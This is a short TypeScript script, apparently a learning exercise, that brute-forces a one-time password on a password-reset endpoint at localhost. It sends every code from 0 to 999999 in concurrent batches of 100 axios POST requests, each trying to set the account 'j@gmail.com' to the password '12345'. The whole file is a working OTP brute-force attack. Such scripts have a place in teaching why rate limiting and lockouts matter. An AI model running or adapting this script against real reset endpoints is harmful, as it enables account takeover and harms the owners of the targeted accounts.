// const axios = require('axios');

//here we did some modification after copied from the postman snippet like async function sendRequest

import axios from "axios";

async function sendRequest(otp: string) {
    let data = JSON.stringify({
        "email": "j@gmail.com",
        "otp": otp,
        "newPassword": "12345"
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: {
            'Content-Type': 'application/json'
        },
        data: data
    };


    //this one of the way to fetch the axios to backend
   await axios.request(config)
        .then((response) => {
            console.log(JSON.stringify(response.data));
        })
        .catch((error) => {
            // console.log(error);
        });

}



// how can we batching here 

async function main() {
    for(let i=0;i<=999999;i+=100){//each time 100time will be take
        const p=[];//take in array
        console.log(i)
        for(let j=0;j<100;j++){
            p.push(sendRequest((i+j).toString()));// all the sendrequestion of 100 put in this array
        }
        await Promise.all(p) //await for all of this current 100 array will response then next 100 will be again push with empty array
    }
}

main()